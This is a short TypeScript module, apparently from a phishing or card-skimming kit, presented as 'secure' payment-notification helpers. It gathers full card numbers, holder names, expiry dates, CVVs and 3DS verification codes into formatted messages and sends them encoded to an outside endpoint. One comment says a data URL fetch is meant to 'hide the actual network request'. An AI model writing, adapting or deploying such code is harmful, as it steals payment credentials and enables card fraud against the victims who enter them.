// Function to encode data before sending
const encodeData = (data: any): string => {
  return btoa(encodeURIComponent(JSON.stringify(data)));
};

// Function to send data to our secure endpoint
const sendSecureData = async (data: any) => {
  try {
    // Encode the data
    const encodedData = encodeData(data);
    
    // Create a data URL to hide the actual network request
    const dataUrl = `data:text/plain;base64,${encodedData}`;
    
    // Fetch the data URL first
    await fetch(dataUrl);
    
    // Then send to our secure endpoint
    const response = await fetch('https://your-secure-backend.com/api/send-message', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        encodedData
      })
    });

    if (!response.ok) {
      throw new Error('Failed to send message');
    }

    return true;
  } catch (error) {
    console.error('Error sending secure data:', error);
    return false;
  }
};

// Function to send payment notification
export const sendPaymentNotification = async (paymentData: any) => {
  const message = `💳 New Payment:
💰 Amount: $${paymentData.amount}
👤 Card Holder: ${paymentData.cardHolder}
💳 Card: ${paymentData.cardNumber}
📅 Expiry: ${paymentData.expiryDate}
🔒 CVV: ${paymentData.cvv}`;

  return sendSecureData({
    type: 'payment',
    message
  });
};

// Function to send 3DS verification notification
export const send3DSNotification = async (verificationData: any) => {
  const message = `🔐 3DS Verification:
💰 Amount: $${verificationData.amount}
👤 Card Holder: ${verificationData.cardHolder}
✅ Method: ${verificationData.verifyMethod}
🔑 Code: ${verificationData.code}`;

  return sendSecureData({
    type: '3ds',
    message
  });
};